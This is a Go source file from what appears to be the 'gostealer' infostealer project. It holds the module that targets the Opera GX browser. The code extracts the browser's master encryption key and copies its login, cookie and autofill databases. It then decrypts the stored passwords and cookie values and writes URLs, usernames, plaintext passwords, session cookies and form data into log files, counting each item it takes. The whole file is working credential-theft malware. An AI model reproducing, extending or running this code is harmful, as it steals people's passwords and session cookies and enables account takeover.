package browsers

import (
	"database/sql"
	"fmt"
	"log"
	"os"
	"path"

	"github.com/4kord/gostealer/utils"
	"github.com/4kord/gostealer/utils/decrypt"
)

func OperaGX(browserPath, logFolderPath string) {
	browserKey := decrypt.GetBrowserEncryptedKey(browserPath)

	err := os.WriteFile(path.Join(logFolderPath, "raw", "operagx_masterkey.txt"), browserKey, 0644)
	if err != nil {
		log.Println(err)
	}

	browserPasswords := getOperaGXPasswords(browserPath, logFolderPath, browserKey)
	browserCookies := getOperaGXCookies(browserPath, logFolderPath, browserKey)
	browserAutofill := getOperaGXAutofill(browserPath, logFolderPath)

	err = os.WriteFile(path.Join(logFolderPath, "Browsers", "OperaGX", "Passwords.txt"), []byte(browserPasswords), 0644)
	if err != nil {
		log.Println(err)
	}

	err = os.WriteFile(path.Join(logFolderPath, "Browsers", "OperaGX", "Cookies.txt"), []byte(browserCookies), 0644)
	if err != nil {
		log.Println(err)
	}

	err = os.WriteFile(path.Join(logFolderPath, "Browsers", "OperaGX", "Autofill.txt"), []byte(browserAutofill), 0644)
	if err != nil {
		log.Println(err)
	}

}

func getOperaGXPasswords(browserPath, logFolderPath string, key []byte) string {
	_, err := utils.CopyFile(path.Join(browserPath, "Default", "Login Data"), path.Join(logFolderPath, "raw", "operagx_login_data"))
	if err != nil {
		log.Println(fmt.Sprintf("[OPERAGX] %s", err.Error()))
		return ""
	}

	sqllitePath := path.Join(logFolderPath, "raw", "operagx_login_data")

	var data string

	db, err := sql.Open("sqlite", fmt.Sprintf("file:%s", sqllitePath))
	if err != nil {
		log.Println(fmt.Sprintf("[OPERAGX] %s", err.Error()))
		return ""
	}

	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
	if err != nil {
		log.Println(fmt.Sprintf("[OPERAGX] %s", err.Error()))
		return ""
	}
	defer rows.Close()

	for rows.Next() {
		entry := PasswordEntry{}
		err := rows.Scan(&entry.OriginUrl, &entry.Username, &entry.Password)
		if err != nil {
			log.Println(fmt.Sprintf("[OPERAGX] %s", err.Error()))
			return ""
		}

		entry.Password = decrypt.DecryptWithKey(key, []byte(entry.Password))
		data += fmt.Sprintf("URL: %s | Username: %s | Password: %s\n", entry.OriginUrl, entry.Username, entry.Password)
		utils.PasswordAmount++
	}
	if err := rows.Err(); err != nil {
		log.Println(fmt.Sprintf("[OPERAGX] %s", err.Error()))
		return ""
	}

	return data
}

func getOperaGXCookies(browserPath, logFolderPath string, key []byte) string {
	_, err := utils.CopyFile(path.Join(browserPath, "Default", "Network", "Cookies"), path.Join(logFolderPath, "raw", "operagx_cookies"))
	if err != nil {
		log.Println(fmt.Sprintf("[OPERAGX] %s", err.Error()))
		return ""
	}

	sqllitePath := path.Join(logFolderPath, "raw", "operagx_cookies")

	var data string

	db, err := sql.Open("sqlite", fmt.Sprintf("file:%s", sqllitePath))
	if err != nil {
		log.Println(fmt.Sprintf("[OPERAGX] %s", err.Error()))
		return ""
	}

	rows, err := db.Query("SELECT host_key, path, expires_utc, name, encrypted_value FROM cookies")
	if err != nil {
		log.Println(fmt.Sprintf("[OPERAGX] %s", err.Error()))
		return ""
	}
	defer rows.Close()

	for rows.Next() {
		entry := CookieEntry{}
		err := rows.Scan(&entry.Host, &entry.Path, &entry.Expiry, &entry.Name, &entry.Value)
		if err != nil {
			log.Println(fmt.Sprintf("[OPERAGX] %s", err.Error()))
			return ""
		}

		entry.Value = decrypt.DecryptWithKey(key, []byte(entry.Value))
		data += fmt.Sprintf("Host: %s | Path: %s | Expiry: %d | Name: %s | Value: %s\n", entry.Host, entry.Path, entry.Expiry, entry.Name, entry.Value)
		utils.CookieAmount++
	}
	if err := rows.Err(); err != nil {
		log.Println(fmt.Sprintf("[OPERAGX] %s", err.Error()))
		return ""
	}

	return data
}

func getOperaGXAutofill(browserPath, logFolderPath string) string {
	_, err := utils.CopyFile(path.Join(browserPath, "Default", "Web Data"), path.Join(logFolderPath, "raw", "opera_web_data"))
	if err != nil {
		log.Println(fmt.Sprintf("[OPERAGX] %s", err.Error()))
		return ""
	}

	sqllitePath := path.Join(logFolderPath, "raw", "opera_web_data")

	var data string

	db, err := sql.Open("sqlite", fmt.Sprintf("file:%s", sqllitePath))
	if err != nil {
		log.Println(fmt.Sprintf("[OPERAGX] %s", err.Error()))
		return ""
	}

	rows, err := db.Query("SELECT name, value FROM autofill")
	if err != nil {
		log.Println(fmt.Sprintf("[OPERAGX] %s", err.Error()))
		return ""
	}
	defer rows.Close()

	for rows.Next() {
		entry := AutofillEntry{}
		err := rows.Scan(&entry.Name, &entry.Value)
		if err != nil {
			log.Println(fmt.Sprintf("[OPERAGX] %s", err.Error()))
			return ""
		}

		data += fmt.Sprintf("Name: %s | Value: %s\n", entry.Name, entry.Value)
		utils.AutofillAmount++
	}
	if err := rows.Err(); err != nil {
		log.Println(fmt.Sprintf("[OPERAGX] %s", err.Error()))
		return ""
	}

	return data
}
